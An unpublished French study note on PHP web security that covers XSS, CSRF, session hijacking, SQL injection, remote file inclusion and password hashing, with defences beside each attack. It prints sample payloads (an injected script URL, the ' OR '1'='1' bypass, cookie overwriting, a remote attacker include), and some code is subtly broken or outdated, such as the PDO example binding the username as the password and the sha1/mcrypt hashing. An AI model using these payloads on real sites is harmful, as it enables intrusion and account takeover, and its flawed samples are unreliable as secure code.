---
published: false
---
# sécurité PHP


Voir la configuration php:
```php
<?php
phpinfo()
```

le fichier de conf de php:
* **php.ini**


## LES ERREURS
* on peut activer la ligne `display_errors = On` dans le fichier **php.ini**.

* sinon dans le code mettre en début de fichier:
```php
error_reporting(E_ALL);
ini_set('display_errors',true);
```

* pour afficher les erreurs il faut utiliser l'extention **xdebug** qui apporte une surcouche au reporting display_errors de PHP. S'il n'est pas present alors il faut l'activer en editant le fichier **/usr/local/php5/php.d/50-extension-xdebug.ini** et supprimer les commentaires puis redemarrer apache.

Ensuite dans le navigateur, il faut activier l'inspecteur d'elements, choisisez l'onglet **NETWORK** pour voir ce qui se passe coté HTTP quand on reçoit des requetes PHP.


## ARCHITECTURE DU SITE
* ne pas nommer simplement les fichier tels que `config.php`, il vaut mieux obfusquer le nome du fichier avec un nom plus complexe.

* l'obfuscation: il faut mettre les fichier sources du site à un niveau au dessus du dossier où apache a acces.
exemple:
```bash
|- src (dossier contenant les fichiers sources .php)
|-vendor (dossier ? )
|-web (dossier contenant le point d'entrée du site, ensuite utiliser des includes, des redirections...)
    |- app.php  (apache lit à partir d'ici)
```

## RECUPERER DES LIBRAIRIES

* aller dans le site www.phpclasses.org   permet de récuperer des classes déja faites (classe d'upload d'image, detection de spam, framework rest, classe pour envoyer des mail etc...) puis on utilise `require` et `include`...

* si on utilise des auto-loader ou des namespace alors il faut ajouter un gestionnaire de modules

* le gestionnaire de module composer: https://getcomposer.org

* pour le telecharger, il faut le faire à la racine du projet, ce qui genere le fichier `getcomposer.phar` : `curl -sS https://getcomposer.org/installer | php`

* pour l'executer, tapez `php composer.phar` puis à la racine du projet en cours il faut creer un fichier `composer.json` sinon composer ne fonctionnera pas, puis
et mettre dedans:
```json
{
    "name" : "test",
    "description" : "test",
    "version" : "0.0"
}
```

* ici on va telecharger swiftmailer, on va d'abord le chercher: 
```bash
$ php composer.phar search swiftmailer
on a en retour: swiftmailer/swiftmailer Swiftmailer, a free feature-rich PHP mailer

swiftmailer/swiftmailer Swiftmailer, free feature-rich PHP mailer   (<---- ici
typo3/swiftmailer A Flow package for easy use of Swift Mailer
duncan3dc/swiftmailer A simple wrapper around swiftmailer
voku/swiftmailer Swiftmailer, free feature-rich PHP mailer
yiisoft/yii2-swiftmailer The SwiftMailer integration for the Yii framework
djordje/li3_swiftmailer Lithium wrapper for swiftmailer
symfony/swiftmailer-bundle Symfony SwiftmailerBundle
cspoo/swiftmailer-mailgun-bundle Swiftmailer Mailgun bundle
wildbit/swiftmailer-postmark A Swiftmailer Transport for Postmark.
accord/mandrill-swiftmailer A SwiftMailer transport implementation for Mandrill
accord/mandrill-swiftmailer-bundle Symfony bundle to provide a Mandrill SwiftMailer service
openbuildings/swiftmailer-css-inliner Inline the css of your html emails
symfony/swiftmailer-bridge Symfony Swiftmailer Bridge
aimeos/ai-swiftmailer SwiftMailer adapter for Aimeos web shops and e-commerce solutions
openbuildings/swiftmailer-filter Whitelist / Blacklist from domains or emails for email sending
```

* pour avoir des info sur le packet:
```bash
php composer.phar show swiftmailer/swiftmailer
```
on a en retour: des infos sur le nom, la description, les version, les prerequis

* pour installer :
```php
php composer.phar require swiftmailer/swiftmailer
```

puis donner la version (à choisir avec la commande show), on met "dev-master"
on a :

```bash
Using version ^5.4 for swiftmailer/swiftmailer
./composer.json has been updated
Loading composer repositories with package information
Updating dependencies (including require-dev)
  - Installing swiftmailer/swiftmailer (v5.4.4)
    Downloading: 100%         

Writing lock file
Generating autoload files
```

cela ajoute la version de swiftmailer dans le .json
cela crée aussi un dossier vendor contenant les sources de swiftmailer, des infos dans le dossier composer et un autoloading de composer 'autoload.php' qui va autoloader des infos depuis composer.


## LES PROTOCOLES
HTTP port 80 données en claire
HTTPS port 443 donnés chiffrés
si on veut utiliser HTTPS sur notre serveur, on sera obligé d'acheter/generer un certificat SSL qu'il faudra installer sur le serveur apache.


## LA FAILLE XSS
vise à exploiter une ingection de contenue dans le navigateur.
On peut tester ces failles en lancant le navigateur en desactivant les protections XSS:
```bash
open -a Google\ Chrome --args --disable-xss-auditor --disable-web-security
```

cela permet d'injecter du code via l'url en utilisant **les variables GET** par exemple..
On peut aussi ajouter du code Javascript.
Du coup, on peut envoyer à la victime un lien avec le code dans l'url puis soutirer ses infos.

Soit un site non protégé avec un lien permettant d'aller sur Google.
ensuite on ouvre la barre inspecter element, puis on recupere les elements de la balise <a></a>
on va dans onglet console:
```javascript
var link = document.getElementsByTagName('a')[0];
link
(renvoie <a href="site-cible-du-lien-par-defaut">Menu</a>
link.href = 'tata.com'
link
(renvoie <a href="tata.com">Menu</a> (ici, on a remplacé le lien!)
```

Donc pour inserer cette faille dans un lien il suffit d'ajouter les balises `script` apres la variable toto par exemple:
```url
mon-site-non-protege.com/info.php?name=toto<script>var link = document.getElementsByTagName('a')[0];link.href = 'tata.com'</script>
```

### Comment s'en proteger ?
il faut echapper les variables.
```php
htmlspecialchars($_GET['name'])  -  Convertit les caractères spéciaux en entités HTML
htmlentities($_GET['name']) - Convertit tous les caractères éligibles en entités HTML  (<- MIEUX, permet de concerver les é,è...)
```

 
LES ATTAQUES CSRF
permet d'inciter un utilisateur de lancer une attaque sans meme que l'utilisateur s'en rende compte.
Il faut utiliser GET dans de l'affichage et non dans la soumission d'information
Pour soumettre il faut utiliser la methode POST
PUT est utilisé pour mettre à jour des informations

pour se protéger contre les attaques CSRF on doit utiliser le token, une clé que l'on rajoute dans le formulaire.
cette clé est generé de tels facon que l'appli connaisse sa logique de création mais pas un utilisateur externe,
on pourra ensuite verifier que le formulaire et la soumission porte bien un token qui est connu de l'appli.

<?php
session_start();

$token = sha1(session_id() . "jeSaleLeToken");  //ici on genere un token, on le sale puis on utilise SHA1

$postedToken = isset($_POST['token']) ? $_POST['token'] : null; //si le token a ete posté alors on lui donne sa valeur sinon on la met à null.

if($postedToken){
    if($postedToken === $token){
        echo 'ok';
    }else{
        echo 'not ok et afficher la page forbiden 418';
    }
}
?>

<form method="post">
    <input type="text" name="nom">
    <input type="hiden" name="token" value="<?php echo $token ?>">  
        //ci-dessus, on utilise un token qui vient d'etre generé, si qqun utilise notre formulaire à l'exterieur et essaie d'appeler
        //le formulaire ou le controler qui recupere les infos du formulaire, et bien il ne pourra pas lui passer le token valide car
        //ce dernier est crée à l'interieur de l'appli
    <input type="submit">
</form>

donc cette methode permet de verifier d'où vient une requete. utiliser une classe qui permet cette verificatin et generer le token



les captchas

telechargez "securimage" et placez la librairie dans la racine du projet.
c'est un niveau de securité suplémentaire, on demande à l'utilisateur de recopier l'info dans l'image.
c'est une protection contre les robots qui ne peuvent voir l'image.
<?php
session_start();
include_once 'secureimage/securimage.php' //inclure la librairie securimage pour analyser le captcha entrée  par l' utilisateur
$securimage = new securimage(); // creation d'un objet securimage
$token = sha1(session_id() . "jeSaleLeToken");
$postedToken = isset($_POST['token']) ? $_POST['token'] : null;
$captcha = isset($_POST['captcha']) ? $_POST['captcha'] : null;  // on verifie si le captcha est null

if($postedToken){
    if($postedToken === $token){
        if($securimage->check($captcha)){ //on test si la captcha est valide
            echo 'ok';
        }else{
            echo 'captcha not valid';
        }
    }else{
        echo 'not ok et afficher la page forbiden 418';
    }
}
?>
<form method="post">
    <label>your name</label>
    <input type="text" name="nom">
    <br />
    <img src="securimage/securimage_show.php"/>
    <br />
    <label>captcha</label> //le captcha 
    <input type="text" name="captcha"> //input du captcha
    <br />
    <input type="hiden" name="token" value="<?php echo $token ?>">  
    <input type="submit">
</form>


VOICI UN EXEMPLE D'ATTAQUE CSRF
---info.php---
<?php
session_start();
var_dump($_COOKIE);
//ici une page simple avec des liens permettant de voter
<a href="vote.php?name=robin">Voter pour Robin</a>
<a href="vote.php?name=julien">Voter pour Julien</a>
<a href="vote.php?name=jeff">Voter pour Jeff</a>
---fin info.php---
---vote.php---
<?php
session_start();

if(!isset($_COOKIE['vote'])){ //on test si le cookie "vote" n'est pas créé
    setcookie('vote',0); //si le cookie n'est pas créé alors on initilise un cookie vote 
    setcookie('jeff',0); // on initialise 3 cookies pour 3 personne avec "0" comme valeur
    setcookie('julien',0);
    setcookie('robin',0);
}

if(isset($_COOKIE['name'])){ //on test si un param "name" est bien passé par GET
    name = $_GET['name']; // on recupere name
    setcookie('vote',++$_COOKIE['vote']); // puis on incremente le cookie "vote"
    setcookie($name,++$_COOKIE[$name]); // et on incremente le cookie du votant
}
header('Location: info.php'); // ensuite on le redirige vers la page info.php
---fin vote.php---


LE hack c'est si on est dans un forum sur lequel on peut ajouter une signature en image,
dans l'image on fait pointer la source dans une url particuliere qui irrait directement voter,
donc quand on affichera la page, on irra voté pour la personne automatiquement sans cliquer sur le lien de vote.

ex: dans info.php on ajoute ceci
<img src="vote.php?name=jeff"/> 

quand on chargera la page info.php cela ajoutera un vote automatiquement pour Jeff

DONC IL FAUT VERIFIER LA SOURCE DE L'ACTION, faire attention aux url et aux passage de parametres.



LE VOLE DE SESSION

une session utilisateur est un espace temporaire dans lequel on va stocker des informations, comme si l'utilisateur est identifié.
il est possible de voler l'info contenu dans la session
<?php
session_start();
$password=isset($_GET['password']) ? $_GET['password'] : null;

if ('monPass' === $password){
    $_SESSION['identified']=true;
}

var_dump(session_id()); //voir le session id 
var_dump($_SESSION); //voir la session
var_dump($_COOKIE);  //ici on peut voir la variable cookie de la session ID soit le PHPSESSID

si dans l'url on fait  "notrepage.php?password=monPass" la variable session "identified" est crée et à pour valeur "true"
le probleme de la session c'est qu'elle genere une variable cookie et on peut injecter des scripts JS pour modifier des choses dans
le navigateur, on peut ecraser la session en cours puis indiquer a un autre navigateur, en connaissant la session d'un utilisateur,
que nous sommes cet utilisateur et se faire identifié sans renseigner de mot de passe.

exemple: en ouvrant la console de debug
document.cookie  // donne le nom de la session PHPSESSID
 
Maintenant on va voir comment on peut détrourner ça et comment sur un autre navigateur on pourrait voler la session de l'utilisateur
car on connait la session de l'utilisateur. on ouvre une nouvelle fenetre de navigation (privé) puis on se rend sur la page en question.
la page va generer une autre session ID different du premier (recharger la page). 

une fois dans la console, ajouter:
document.cookie="PHPSESSID=ANCIENNE-SESSION"

et là, on vient de récuperer la session de l'utilisateur precedent sans connaitre son mot de passe.

COMMENT S'en proteger ?

- la meilleur des solutions serait de ne pas stocker des informations sensibles dans les variables de SESSION.
les infos importantes seront stocké plutot en bdd.
- autre possibilité c'est de stocker l'ip de l'utilisateur, cela permet de voir si c'est toujour le meme utilisateur:
$_SESSION['IP']=$_SERVER['REMOTE_ADDR'];
- la meilleur des solution serait de ne pas avoir le meme session ID au début et au moment ou on s'identifie
donc :
<?php
// sur cette ligne, un lien permettant l'envoie de la session ID chez le pirate
session_start(); <== ICI 
$password=isset($_GET['password']) ? $_GET['password'] : null;

if ('monPass' === $password){ <== ET LA
    $_SESSION['identified']=true;
}
Ce qu'il faut faire c'est de changer la session ID au moment de la connexion grace a "session_regenerate_id()", comme ça l'utilisateur n'aura pas la meme
session ID une fois connecté:
<?php
// sur cette ligne, un lien permettant l'envoie de la session ID chez le pirate
session_start(); 
var_dump(session_id()); //voir la 1ere session id 
$password=isset($_GET['password']) ? $_GET['password'] : null;

if ('monPass' === $password){
    session_regenerate_id(); // ici on regenere une nouvelle session ID
    var_dump(session_id()); //voir la 2eme session id 
    $_SESSION['identified']=true;
    $_SESSION['IP']=$_SERVER['REMOTE_ADDR'];
}




INJECTION SQL

soit un formulaire de connexion:

<?php
mysql_connect('localhost','root',null);
mysql_select_db('info');

$username=isset($_POST['username']) ? $_POST['username'] : null;
$password=isset($_POST['password']) ? $_POST['password'] : null;

$sql=mysql_query("SELECT * FROM admin WHERE user = '$username' and password = '$password'");

if ($result = mysql_fetch_assoc($sql)){
    var_dump($result);
}else{
    echo 'mauvais mot de passe';
}

?>

<h1>connexion</h1>
<form method="post">
    <label>username:</label>
    <input type="text" name="username">
    <label>password:</label>
    <input type="password" name="password">
    <<input type="submit">
</form>

CETTE REQUETE SQL COMPORTE UNE FAILLE DE SECURITE IMPORTANTE
car sans utilisateur et sans mot de passe il est possible de se connecter recuperer les données d'un utilisateur

 en ajoutant simplement ( ' OR '1'='1' )
 
 SELECT * FROM admin WHERE user = '' OR '1'='1' and password = '' OR '1'='1'

 VOILA, ici on recupere tout de la table admin tels que user est egale 
 vide OU 1 est égale a 1 donc true ET tels que password est egale a vide OU
 1 est egale a 1 donc true

 TRUE et TRUE = TRUE

 Donc on récupere la base de donnée.

 Comment se proteger?
- 1ere solution (pas la meilleur): Il faut échaper les variables POST
 avec "mysql_real_escape_string()"
 ex:
$username=isset($_POST['username']) ? mysql_real_escape_string($_POST['username']) : null;
$password=isset($_POST['password']) ? mysql_real_escape_string($_POST['password']) : null;

- 2eme solution utiliser l'objet PDO:
<?php
//mysql_connect('localhost','root',null);
//mysql_select_db('info');

$pdo=new PDO('mysql:host=localhost;dbname=info','root',null);

//$username=isset($_POST['username']) ? $_POST['username'] : null;
//$password=isset($_POST['password']) ? $_POST['password'] : null;

//preparation de la requete avec PDO
$stmt = $pdo->prepare('SELECT * FROM admin WHERE user = :user and password = :password');
//pour ajouter des param et binder sur qqch on fait
$stmt->bindParam(':user',$username);
$stmt->bindParam(':password',$password);

$username=$_POST['username'];
$password=$_POST['username'];

$stmt->execute();
//$sql=mysql_query("SELECT * FROM admin WHERE user = '$username' and password = '$password'");

if ($result = $stmt->fetchObject()){
    var_dump($result);
}else{
    echo 'mauvais mot de passe';
}

?>

<h1>connexion</h1>
<form method="post">
    <label>username:</label>
    <input type="text" name="username">
    <label>password:</label>
    <input type="password" name="password">
    <<input type="submit">
</form>

- solution 3 (solution ULTIME): utiliser un ORM (Object Relational Mapper)
utiliser par exemple l'ORM Doctirne, il permet d'ecrire des requetes dans un langage particulier
puis de les faire joué dans un ensemble d'outils qui va s'occuper de travailer la requete jusqu'a
son lancement final soit la récuperation des objet et la remonté d'informations

il utilise le langage DQL

 


 LES MOTS DE PASSES
 voir le generateur de mot de passe : strongpasswordgenerator.com
   
- pour les password il faut utiliser un sha1 et le saler

<?php
$pdo=new PDO('mysql:host=localhost;dbname=info','root',null);

//$username=isset($_POST['username']) ? $_POST['username'] : null;
//$password=isset($_POST['password']) ? $_POST['password'] : null;

//preparation de la requete avec PDO
$stmt = $pdo->prepare('SELECT * FROM admin WHERE user = :user and password = :password');
//pour ajouter des param et binder sur qqch on fait
$stmt->bindParam(':user',$username);
$stmt->bindParam(':password',$password);

$username=isset($_POST['username']) ? $_POST['username'] : null;
$password=isset($_POST['password']) ? sha1($_POST['password']."SALER-LE-PWD-AVEC-CETTE-chaine") : null;

$stmt->execute();

if ($result = $stmt->fetchObject()){
    var_dump($result);
}else{
    echo 'mauvais mot de passe';
}

?>

<h1>connexion</h1>
<form method="post">
    <label>username:</label>
    <input type="text" name="username">
    <label>password:</label>
    <input type="password" name="password">
    <<input type="submit">
</form>


- on peut utiliser "mcrypt" qui permet de créer un hash du password
 creer un salt de protection:
 $salt = strtr(base64_encode(mcrypt_create_iv(16, MCRYPT_DEV_URANDOM)), '+','.');
 $cost=10; cout de cryptage, plus il sera elevé plus il sera gourmant temps processeur
 $salt = sprintf("2a$%02d$",$cost) . $salt; //ajout du cout de fonctionnement
 
 var_dump($salt); // pour voir le salt qu'on a crée

Maintenant on crée un Hash du pasword en utilisant crypt()
$password = sha1('monpass'.'saler');
$hash = crypt($password, $salt);
var_dump($hash); // pour afficher le hash

Donc il faudra faire ceci durant l'inscription pour l'inserer dans la BDD
ensuite durant la connexion, il suffira de récuperer le password entrée par l'user
puis refaire la hash pour voir si c'est la meme chose:
ex:
if ($user = $stmt->fetchObject()){
    //ici, on compare le password hashé avec le hash
    if(crypt($password, $user->hash) === $user->hash){
        var_dump($user);
    }  
}else{
    echo 'mauvais mot de passe';
}

Dans la bdd on a la colonne password avec le sha1 et une colone hash
Faire une classe qui crée la password, le salt, etc...


- dans la Version 5.5, php permet d'utiliser la fonction password_hash() et la fonction password_verify()
qui vont nous permettre de faire la meme chose vu precedement mais en beaucoup plus simple.$_COOKIE
password_hash prend en parametre un password un algo et un tableau d'options.

string password_hash(string $password, integer $algo [,array $option])

echo password_hash("mon-password", PASSWORD_DEFAULT);
resultat: $2y$10$.vGA109wmRjrwAVXD98HNOgsNpDcz1qm3Jq7KnEd1rVAGv3Fykk1a

ou encore

$options = [
    'cost' => 12,
];

echo password_hash("monPass", PASSWORD_BCRYPT, $options);

ou encore mieux

$options = [
    'cost' => 12,
    'salt' => mcrypt_create_iv(22, MCRYPT_DEV_URANDOM),
];

echo password_hash("monPass", PASSWORD_BCRYPT, $options);

Une foi le password crée il faut le verifier avec password_verify()

boolean password_verify(string $password, string $hash)
if (password_verify('monPass', $hash)){
    echo 'OK';
}else{
    echo 'mauvais mot de passe'
}

maintenant il suffit de créer une classe anglobant ces fonctions..


UTILISER LES TYPAGES DE VARIABLES

on peut forcer le typage:
$number =1;
$text ='1';

var_dump($number == (int)$text); => true

verifier le type d'une variable:
var_dump(gettype((int) $text)); => integer

si on caste en (bool) une chaine de caractere alors elle sera toujours egale a TRUE


REECRIRE DES PARAMETRES DE DONNES

info.php?id=4&comment=50
on peut voir les paramettres de l'appli... 

Apache permet la réecriture d'url pour obfusquer les parametres

dans la racine, creer un .htaccess, dans lequel on va inclure des regles
de réecriture.

la 1ere regle c'est de définir que l'on veut démarer la réécriture d'url:
RewriteEngine on

RewriteBase /~dossier/web/ 
// c'est l'endroit ou est installer le site, 
// dans l'url c'est ce qu'il y a avant mapage.php:
// localhost/~dossier/web/info.php?id=4&comment=50
// c'est tout ça "/~dossier/web/" 

RewriteRule înfo-([0-9]+)-([0-9]+)\.html$ info.php?id=$1&comment=$2
//ecrire des regles de redirections
// on reecrit l'url, maintenant il suffit d'utiliser cette url:
info.php-4-50.html
a la place de
info.php?id=4&comment=50

grace à la réécriture, on n'expose plus de model de donnée directement dans les url
on peut faire de l'ecriture sementique et on peut utiliser cela dans le REFERENCEMENT.



INCLUDE ET REQUIRE

include ne break pas la suite du script quand il retourne une erreur
require break la suite du script quand il retourne une erreur
header('Location: info.php'); header permet de spécifier l'en-tête HTTP string lors de l'envoi des fichiers HTML.

- l'injection de script
soit 2 fichiers php, info.php et plop.php
dans info.php:
<?php
$script = $_GET['script'];
include $script;
echo 'toto';

dans plop.php:
<?php
echo 'toto2<br />';


le fait d'inclure dans include ou require une variable récupéré dans l'url constitue une faille

info.php?script=plop.php

car on peut lui faire inclure autre choses comme une url pointant un mauvais script

info.php?script=http://www.mechantpirate-a.fr/script.php


comment bloquer cela ?

c'est de créér une fonction interne qui fait du mapping, on lui donne un nom puis
la fonction verifie si le ficher existe:

function includeScript($key){
    $scriptBase = array(
        'menu' => 'plop.php'
    );

    return $scriptBase[$key];
}

$script = $_GET['script'];

include includeScript($script);

Puis quand on tape cette url:
info.php?script=menu

alors plop.php sera inclus





POUR TESTER SON SITE:
- skipfish  (web application security scanner)
c'est un scanner qui va effectuer des test sur le site
puis un rapport est generé (dit les possibilité de failles)

il faut copier dictionnaires et signatures dans la racine du projet
puis dans le terminal :
skipfish -o scan http://baliz.org

puis ouvrir l'index.html qui est le resultat du scan 
orange important
bleu moins important
gris des infos
vert des notes

 
- phpqatools.org
les outis pour la securité: PHP_CodeSniffer et PHP Mess Detector
pour garantire qu'un code est bien ecrit et q'un site est bien réalisé on parlera de qualité de code
 
-- php mess detector (faire du code plus propre):
  pour le lancer, dans un terminal:
  phpmd 

  phpmd config html cleancode > phpmd.html


-- php_code_sniffer (verifie le code)
pour le lancer:
phpcs config


- phpDocumentor
quand on a un code commenté exemple dans info.php on a en en-tete:

/**
 * Reverse a key to script name
 *
 * @param String $key key to convert to script name
 *
 * @return String Real script name to include
 */

pour le lancer:
phpdoc -f info.php
va generer une doc en lisant le script dans le dossir output/index.html

on peut faire de la doc sur une classe, une fonction etc automatiquement avec phpDoc





(verifier l'ancieneté de la session $_SESSION['last_access']=time(); )
(tester avec if(time()-$_SESSION['last_access']>$session_timeout) )
